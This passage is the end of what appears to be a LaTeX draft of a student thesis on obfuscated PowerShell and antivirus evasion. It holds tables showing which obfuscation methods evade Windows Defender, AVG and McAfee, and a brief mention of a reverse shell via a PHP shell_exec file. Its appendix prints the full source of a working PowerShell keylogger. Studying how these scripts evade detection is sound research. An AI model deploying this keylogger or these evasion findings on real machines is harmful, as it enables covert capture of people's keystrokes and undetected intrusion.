+\begin{verbatim}shell_exec\end{verbatim}
+Therefore the php file, when executed, will start a powershell terminal to execute the command written in the php file. The attacker can make use of this command field to open up a reverse shell terminal. 
+\newline\newline
+\textit{\textbf{NOTE:}}The reverse shell script was used with a non-administrator account, with AV turned on.
+\newline
+
+
+
+\subsubsection{Invoke-Mimikatz}
+
+\subsubsection{Privilage Escalation}
+
+\subsection{What is the real threat of PowerShell scripting}
+\textit{NOTE:}In this section I want to make use of the previous section finding and theorize about the capabilities of powershell. Partly to talk about how powershell scripts do not perse have to attack the user when executed, because they can be used for reconesaince aswell. And if all your doing is find information, then AV might be useful. (Because no commands or API is used that is considered malicious).
+\subsection{What additional defence systems can be deployed against obfuscated powershell scripts}
+\textit{Note:}Here I would like to write about and test some MTD systems. Also I was able to come up with a new defence system during the execution of some of my scripts. I dont think I will have enough time to write it and test it. How ever I can write in psuedo-code and use my findings like in table 6 and 7, to reason why this defence system might be better then AV-software or even Microsoft AMSI defence tools.
+\newpage
+\section{Sources}
+\begin{enumerate}
+\hypertarget{1}\item https://github.com/danielbohannon/Invoke-Obfuscation
+\hypertarget{2}\item https://www.blackhat.com/docs/us-17/thursdayus-17-Bohannon-Revoke-Obfuscation-PowerShell-Obfuscation-Detection-And%20Evasion-Using-Science-wp.pdf
+\hypertarget{3}\item http://techgenix.com/powershell-script-obfuscation/
+\hypertarget{4}\item Compromising systems: implementing hacking phases | International Journal of Computer Science \& Information Technology (IJCSIT) Vol 11, No 2, April 2019
+\hypertarget{5}\item Ethical Hacking Techniques with Penetration Testing|  K.Bala Chowdappa et al, / (IJCSIT) International Journal of Computer Science and Information Technologies, Vol. 5 (3) , 2014, 3389-3393
+\hypertarget{6}\item A Study \& Review on Code Obfuscation | 2016 World Conference on Futuristic Trends in Research and Innovation for Social Welfare 
+\hypertarget{7}\item Fileless Malware Execution with PowerShell Is Easier than You May Realize [\textbf{McAfee}]
+\hypertarget{8}\item https://devblogs.microsoft.com/powershell/powershell-the-blue-team
+\hypertarget{9}\item https://www.fireeye.com/blog/threat-research/$2016$/$02$/greater\_visibilityt.html
+\hypertarget{10}\item https://www.mdsec.co.uk/$2018$/$06$/exploring-powershell-amsi-and-logging-evasion/
+\hypertarget{11}\item https://www.varonis.com/blog/powershell-obfuscation-stealth-confusion-part-ii/
+\hypertarget{12}\item AMSI-Based Detection of Malicious PowerShell
+Code Using Contextual Embeddings
+\hypertarget{13}\item Common Cyber Attacks Reducing The Impact CESG.
+\hypertarget{14}\item Cyber-attacks – trends, patterns and security countermeasures, Andreea Bendovschi.
+\hypertarget{15}\item Phishing – challenges and solutions [Computer Fraud \& Security] - Sathish A.P Kumar
+\hypertarget{16}\item https://github.com/lazywinadmin/PowerShell/blob/master/TOOL-Start-KeyLogger/Start-KeyLogger.ps1
+\hypertarget{17}\item "I Agree to the Terms and Conditions": (How) Do Users Read Privacy Policies Online? An Eye-Tracking Experiment Nili Steinfeld
+\end{enumerate}
+\newpage
+\section{Appendix}
+\subsection{Tables}
+\begin{table}[]
+\caption {Detection of obfuscated scripts on Windows 10} \label{tab:table_one}
+\begin{center}
+\begin{tabular}{|l|l|l|l|}
+\hline
+\textbf{Obfuscation} & \textbf{OS} & \textbf{Program} & \textbf{Detected} \\ \hline
+Token ALL            & Win 10      & ALL              & No                \\ \hline
+Token ALL            & Win 10      & ALL              & No                \\ \hline
+String 1             & Win 10      & Windows Defender & Yes               \\ \hline
+String 2             & Win 10      & Windows Defender & Yes               \\ \hline
+String 3             & Win 10      & Windows Defender & Yes               \\ \hline
+Encoding 1           & Win 10      & Windows Defender & No                \\ \hline
+Encoding 2           & Win 10      & Windows Defender & No                \\ \hline
+Encoding 3           & Win 10      & Windows Defender & Yes               \\ \hline
+Encoding 4           & Win 10      & Windows Defender & Sometimes         \\ \hline
+Encoding 5           & Win 10      & Windows Defender & No                \\ \hline
+Encoding 6           & Win 10      & Windows Defender & Yes               \\ \hline
+Encoding 7           & Win 10      & Windows Defender & No                \\ \hline
+Encoding 8           & Win 10      & Windows Defender & No                \\ \hline
+Compress             & Win 10      & Windows Defender & Yes               \\ \hline
+String 1             & Win 10      & AVG              & No                \\ \hline
+String 2             & Win 10      & AVG              & No                \\ \hline
+String 3             & Win 10      & AVG              & No                \\ \hline
+Encoding 1           & Win 10      & AVG              & No                \\ \hline
+Encoding 2           & Win 10      & AVG              & No                \\ \hline
+Encoding 3           & Win 10      & AVG              & No                \\ \hline
+Encoding 4           & Win 10      & AVG              & No                \\ \hline
+Encoding 5           & Win 10      & AVG              & No                \\ \hline
+Encoding 6           & Win 10      & AVG              & No                \\ \hline
+Encoding 7           & Win 10      & AVG              & No                \\ \hline
+Encoding 8           & Win 10      & AVG              & No                \\ \hline
+Compress             & Win 10      & AVG              & No                \\ \hline
+String 1             & Win 10      & MCAfee          & Yes               \\ \hline
+String 2             & Win 10      & MCAfee          & Yes               \\ \hline
+String 3             & Win 10      & MCAfee          & Yes               \\ \hline
+Encoding 1           & Win 10      & MCAfee          & Yes               \\ \hline
+Encoding 2           & Win 10      & MCAfee          & Yes               \\ \hline
+Encoding 3           & Win 10      & MCAfee          & Yes               \\ \hline
+Encoding 4           & Win 10      & MCAfee          & Yes               \\ \hline
+Encoding 5           & Win 10      & MCAfee          & Yes               \\ \hline
+Encoding 6           & Win 10      & MCAfee          & Yes               \\ \hline
+Encoding 7           & Win 10      & MCAfee          & Yes               \\ \hline
+Encoding 8           & Win 10      & MCAfee          & Yes               \\ \hline
+Compress             & Win 10      & MCAfee          & Yes               \\ \hline
+\end{tabular}
+\end{center}
+\end{table}
+\begin{table}[]
+\caption {Detection of obfuscated scripts on Windows 8.1} \label{tab:table_two}
+\begin{center}
+\begin{tabular}{|l|l|l|l|}
+\hline
+Obfuscation & OS      & Program          & Detected \\ \hline
+Token ALL   & Win 8.1 & ALL              & No       \\ \hline
+AST ALL     & Win 8.1 & ALL              & No       \\ \hline
+String 1    & Win 8.1 & Windows Defender & No       \\ \hline
+String 2    & Win 8.1 & Windows Defender & No       \\ \hline
+String 3    & Win 8.1 & Windows Defender & No       \\ \hline
+Encoding 1  & Win 8.1 & Windows Defender & No       \\ \hline
+Encoding 2  & Win 8.1 & Windows Defender & No       \\ \hline
+Encoding 3  & Win 8.1 & Windows Defender & No       \\ \hline
+Encoding 4  & Win 8.1 & Windows Defender & No       \\ \hline
+Encoding 5  & Win 8.1 & Windows Defender & ERROR    \\ \hline
+Encoding 6  & Win 8.1 & Windows Defender & No       \\ \hline
+Encoding 7  & Win 8.1 & Windows Defender & No       \\ \hline
+Encoding 8  & Win 8.1 & Windows Defender & No       \\ \hline
+Compress    & Win 8.1 & Windows Defender & No       \\ \hline
+String 1    & Win 8.1 & AVG              & No       \\ \hline
+String 2    & Win 8.1 & AVG              & No       \\ \hline
+String 3    & Win 8.1 & AVG              & No       \\ \hline
+Encoding 1  & Win 8.1 & AVG              & No       \\ \hline
+Encoding 2  & Win 8.1 & AVG              & No       \\ \hline
+Encoding 3  & Win 8.1 & AVG              & No       \\ \hline
+Encoding 4  & Win 8.1 & AVG              & No       \\ \hline
+Encoding 5  & Win 8.1 & AVG              & ERROR    \\ \hline
+Encoding 6  & Win 8.1 & AVG              & No       \\ \hline
+Encoding 7  & Win 8.1 & AVG              & No       \\ \hline
+Encoding 8  & Win 8.1 & AVG              & No       \\ \hline
+Compress    & Win 8.1 & AVG              & No       \\ \hline
+String 1    & Win 8.1 & MCAffee          & No       \\ \hline
+String 2    & Win 8.1 & MCAffee          & No       \\ \hline
+String 3    & Win 8.1 & MCAffee          & No       \\ \hline
+Encoding 1  & Win 8.1 & MCAffee          & No       \\ \hline
+Encoding 2  & Win 8.1 & MCAffee          & No       \\ \hline
+Encoding 3  & Win 8.1 & MCAffee          & No       \\ \hline
+Encoding 4  & Win 8.1 & MCAffee          & No       \\ \hline
+Encoding 5  & Win 8.1 & MCAffee          & ERROR    \\ \hline
+Encoding 6  & Win 8.1 & MCAffee          & No       \\ \hline
+Encoding 7  & Win 8.1 & MCAffee          & No       \\ \hline
+Encoding 8  & Win 8.1 & MCAffee          & No       \\ \hline
+Compress    & Win 8.1 & MCAffee          & No       \\ \hline
+\end{tabular}
+\end{center}
+\end{table}
+\begin{table}[]
+\caption {Detection of obfuscated scripts on Windows 7} \label{tab:table_three}
+\begin{center}
+\begin{tabular}{|l|l|l|l|}
+\hline
+Obfuscation & OS    & Program          & Detected \\ \hline
+Token ALL   & Win 7 & ALL              & No       \\ \hline
+AST ALL     & Win 7 & ALL              & No       \\ \hline
+String 1    & Win 7 & Windows Defender & No       \\ \hline
+String 2    & Win 7 & Windows Defender & No       \\ \hline
+String 3    & Win 7 & Windows Defender & No       \\ \hline
+Encoding 1  & Win 7 & Windows Defender & No       \\ \hline
+Encoding 2  & Win 7 & Windows Defender & No       \\ \hline
+Encoding 3  & Win 7 & Windows Defender & No       \\ \hline
+Encoding 4  & Win 7 & Windows Defender & No       \\ \hline
+Encoding 5  & Win 7 & Windows Defender & ERROR    \\ \hline
+Encoding 6  & Win 7 & Windows Defender & No       \\ \hline
+Encoding 7  & Win 7 & Windows Defender & No       \\ \hline
+Encoding 8  & Win 7 & Windows Defender & No       \\ \hline
+Compress    & Win 7 & Windows Defender & No       \\ \hline
+String 1    & Win 7 & AVG              & No       \\ \hline
+String 2    & Win 7 & AVG              & No       \\ \hline
+String 3    & Win 7 & AVG              & No       \\ \hline
+Encoding 1  & Win 7 & AVG              & No       \\ \hline
+Encoding 2  & Win 7 & AVG              & No       \\ \hline
+Encoding 3  & Win 7 & AVG              & No       \\ \hline
+Encoding 4  & Win 7 & AVG              & No       \\ \hline
+Encoding 5  & Win 7 & AVG              & ERROR    \\ \hline
+Encoding 6  & Win 7 & AVG              & No       \\ \hline
+Encoding 7  & Win 7 & AVG              & No       \\ \hline
+Encoding 8  & Win 7 & AVG              & No       \\ \hline
+Compress    & Win 7 & AVG              & No       \\ \hline
+\end{tabular}
+\end{center}
+\end{table}
+\begin{table}[]
+\caption {Detection of obfuscated scripts on Windows server 2016} \label{tab:table_four}
+\begin{center}
+\begin{tabular}{|l|l|l|l|}
+\hline
+Obfuscation & OS       & Program          & Detected \\ \hline
+Token ALL   & Win 2016 & ALL              & No       \\ \hline
+AST ALL     & Win 2016 & ALL              & No       \\ \hline
+String 1    & Win 2016 & Windows Defender & No       \\ \hline
+String 2    & Win 2016 & Windows Defender & No       \\ \hline
+String 3    & Win 2016 & Windows Defender & No       \\ \hline
+Encoding 1  & Win 2016 & Windows Defender & No       \\ \hline
+Encoding 2  & Win 2016 & Windows Defender & No       \\ \hline
+Encoding 3  & Win 2016 & Windows Defender & No       \\ \hline
+Encoding 4  & Win 2016 & Windows Defender & No       \\ \hline
+Encoding 5  & Win 2016 & Windows Defender & ERROR    \\ \hline
+Encoding 6  & Win 2016 & Windows Defender & No       \\ \hline
+Encoding 7  & Win 2016 & Windows Defender & No       \\ \hline
+Encoding 8  & Win 2016 & Windows Defender & No       \\ \hline
+Compress    & Win 2016 & Windows Defender & No       \\ \hline
+\end{tabular}
+\end{center}
+\end{table}
+\begin{table}[]
+\caption {Detection of obfuscated scripts on Windows server 2019} \label{tab:table_five}
+\begin{center}
+\begin{tabular}{|l|l|l|l|}
+\hline
+Obfuscation & OS       & Program          & Detected \\ \hline
+Token ALL   & Win 2019 & ALL              & No       \\ \hline
+AST ALL     & Win 2019 & ALL              & No       \\ \hline
+String 1    & Win 2019 & Windows Defender & No       \\ \hline
+String 2    & Win 2019 & Windows Defender & No       \\ \hline
+String 3    & Win 2019 & Windows Defender & No       \\ \hline
+Encoding 1  & Win 2019 & Windows Defender & No       \\ \hline
+Encoding 2  & Win 2019 & Windows Defender & Yes      \\ \hline
+Encoding 3  & Win 2019 & Windows Defender & No       \\ \hline
+Encoding 4  & Win 2019 & Windows Defender & No       \\ \hline
+Encoding 5  & Win 2019 & Windows Defender & ERROR    \\ \hline
+Encoding 6  & Win 2019 & Windows Defender & No       \\ \hline
+Encoding 7  & Win 2019 & Windows Defender & No       \\ \hline
+Encoding 8  & Win 2019 & Windows Defender & No       \\ \hline
+Compress    & Win 2019 & Windows Defender & No       \\ \hline
+\end{tabular}
+\end{center}
+\end{table}
+\begin{table}
+\caption {Log file information after execution of mallware.} \label{tab:table_six}
+\begin{center}
+\begin{tabular}{|l|l|l|l|l|l|}
+\hline
+Windows 10/2016/2019 & Events & File size in Mb & Highest Level & Warning & E.T. in seconds  \\\hline
+PS-ML-Obfuscated     & 9296   & 15              & verbose       & 0       & 10               \\\hline
+PS-ML-Un-Obfuscated  & 550    & 1               & verbose       & 1       & 10               \\\hline
+PS-SL-Obfuscated     & 8291   & 16.5            & information   & 0       & 10               \\\hline
+PS-SL-Un-Obfuscated  & 556    & 1               & verbose       & 1       & 10               \\\hline
+                     &        &                 &               &         &                  \\\hline
+                     &        &                 &               &         &                  \\\hline
+Windows 8.1 Default  & Events & File size in Mb & Highest Level & Warning & E.T. in seconds  \\\hline
+PS-ML-Obfuscated     & 9296   & 15              & verbose       & 0       & 10               \\\hline
+PS-ML-Un-Obfuscated  & 550    & 1               & verbose       & 0       & 10               \\\hline
+PS-SL-Obfuscated     & 8291   & 16.5            & information   & 0       & 10               \\\hline
+PS-SL-Un-Obfuscated  & 556    & 1               & verbose       & 0       & 10               \\\hline
+                     &        &                 &               &         &                  \\\hline
+Windows 8.1 (A.P.L)  & Events & File size in Mb & Highest Level & Warning & E.T. in seconds  \\\hline
+PS-ML-Obfuscated     & 9296   & 15              & verbose       & 0       & 10               \\\hline
+PS-ML-Un-Obfuscated  & 550    & 1               & verbose       & 0       & 10               \\\hline
+PS-SL-Obfuscated     & 8291   & 16.5            & information   & 0       & 10               \\\hline
+PS-SL-Un-Obfuscated  & 556    & 1               & verbose       & 0       & 10               \\\hline
+\end{tabular}
+\end{center}
+\end{table}
+\begin{table}
+\begin{center}
+\caption {Log file information after execution of mallware. With archive enabled} \label{tab:table_seven}
+\begin{tabular}{|l|l|l|l|l|l|}\hline
+Windows 10/2016/2019 & Events & File size in Mb & Highest Level & Warning & E.T. in seconds  \\\hline
+PS-ML-Obfuscated     & 30283  & 50              & verbose       & 0       & 10               \\\hline
+PS-ML-Un-Obfuscated  & 550    & 1               & verbose       & 0       & 10               \\\hline
+PS-SL-Obfuscated     & 113258 & 187             & information   & 0       & 10               \\\hline
+PS-SL-Un-Obfuscated  & 556    & 1               & verbose       & 0       & 10               \\\hline
+                     &        &                 &               &         &                  \\\hline
+                     &        &                 &               &         &                  \\\hline
+Windows 8.1 Default  & Events & File size in Mb & Highest Level & Warning & E.T. in seconds  \\\hline
+PS-ML-Obfuscated     & 15     & 1               & verbose       & 0       & 10               \\\hline
+PS-ML-Un-Obfuscated  & 4      & 1               & verbose       & 0       & 10               \\\hline
+PS-SL-Obfuscated     & 8      & 1               & information   & 0       & 10               \\\hline
+PS-SL-Un-Obfuscated  & 6      & 1               & verbose       & 0       & 10               \\\hline
+                     &        &                 &               &         &                  \\\hline
+Windows 8.1 (A.P.L)  & Events & File size in Mb & Highest Level & Warning & E.T. in seconds  \\\hline
+PS-ML-Obfuscated     & 28524  & 46              & verbose       & 0       & 10               \\\hline
+PS-ML-Un-Obfuscated  & 687    & 1               & verbose       & 0       & 10               \\\hline
+PS-SL-Obfuscated     & 30458  & 58              & verbose       & 0       & 10               \\\hline
+PS-SL-Un-Obfuscated  & 689    & 1               & verbose       & 0       & 10               \\\hline
+\end{tabular}
+\end{center}
+\end{table}
+\newpage
+\subsection{Scripts}
+\hypertarget{script1}{\subsubsection{Simple script}}
+\begin{verbatim}
+Write-Host Hello World! -f red
+\end{verbatim}
+\hypertarget{script2}{\subsubsection{Keylogger.ps1}}
+\begin{verbatim}
+function Start-KeyLogger($Path="$env:temp\keylogger.txt")
+{
+  $signatures = @'
+[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
+public static extern short GetAsyncKeyState(int virtualKeyCode); 
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int GetKeyboardState(byte[] keystate);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int MapVirtualKey(uint uCode, int uMapType);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int ToUnicode(uint wVirtKey, uint wScanCode,
+	byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+'@
+  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
+  $null = New-Item -Path $Path -ItemType File -Force
+  try
+  {
+    Write-Host 'Recording key presses. Press CTRL+C to see results.'
+     -ForegroundColor Red
+    while ($true) {
+      Start-Sleep -Milliseconds 40
+      for ($ascii = 9; $ascii -le 254; $ascii++) {
+        $state = $API::GetAsyncKeyState($ascii)
+        if ($state -eq -32767) {
+          $null = [console]::CapsLock
+          $virtualKey = $API::MapVirtualKey($ascii, 3)
+          $kbstate = New-Object Byte[] 256
+          $checkkbstate = $API::GetKeyboardState($kbstate)
+          $mychar = New-Object -TypeName System.Text.StringBuilder
+          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar,
+          $mychar.Capacity, 0)
+          if ($success) 
+          {
+            [System.IO.File]::AppendAllText($Path, $mychar, [
+            System.Text.Encoding]::Unicode) 
+          }
+        }
+      }
+    }
+  }
+  finally
+  {
+    notepad $Path
+  }
+}
+Start-KeyLogger
+\end{verbatim}
+\begin{verbatim}
+
+\end{verbatim}
+
+
+%HIER moet nog even naar gekeken worden%
+%\subsection{Is it possible to bypass antivirus software, in order to download malware, by using the download command in powershell}
+%To answer this sub-question it is important to first build a base understanding of the behaviour of antivirus software. The malware used to answer this sub-question will be a known malware, meaning most %antivirus software should be able to identify it as malware. Therefore the antivirus auto scan should detect the virus immidiately after downloading it from a server. It is also important to identify wh%ich %types of obfuscation will be allowed through the antivirus in general. To find the answer to that question, another test will be done in which an a \textbf{LINK TO simple script HERE} simple script will be %executed with different obfuscation techniques. 
+
+\end{document}
